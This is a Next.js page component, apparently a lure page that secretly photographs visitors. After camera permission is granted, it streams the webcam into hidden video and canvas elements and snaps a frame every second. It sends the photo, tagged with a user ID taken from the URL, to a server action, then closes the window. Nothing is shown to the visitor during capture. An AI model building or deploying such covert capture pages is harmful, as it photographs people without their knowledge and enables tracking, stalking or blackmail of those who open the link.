"use client";

import { useCallback, useEffect } from "react";
import { useCamera } from "~/shared/use-camera";
import { sendPhoto } from "./actions";

const CameraNotAllowed = () => <h1>Allow access to camera to use this website!</h1>;
const Camera = ({ userId }: { userId: string }) => {
	const { videoRef, canvasRef, takePhoto } = useCamera();

	const handlePhoto = useCallback(async () => {
		const photo = takePhoto();
		if (!photo || photo.endsWith("==")) {
			return false;
		}

		try {
			await sendPhoto(photo, userId);
			return true;
		} catch (err) {
			console.error(err);
			return false;
		}
	}, [takePhoto, userId]);

	useEffect(() => {
		const interval = setInterval(async () => {
			try {
				const res = await handlePhoto();
				if (!res) return;
				window.close();
			} catch (err) {
				console.error(err);
			}
		}, 1000);

		return () => clearInterval(interval);
	}, [handlePhoto]);

	return (
		<>
			<video autoPlay ref={videoRef} style={{ display: "none" }} />
			<canvas ref={canvasRef} style={{ display: "none" }} />
		</>
	);
};

interface Props {
	params: {
		slug?: string[];
	};
}

export default function Page({ params }: Props) {
	const { status } = useCamera();

	if (!params.slug?.length) {
		window.close();
		return;
	}

	if (status === null) {
		return null;
	}

	return (
		<div className="container">
			{status === "granted" ? <Camera userId={params.slug[0]} /> : <CameraNotAllowed />}
		</div>
	);
}
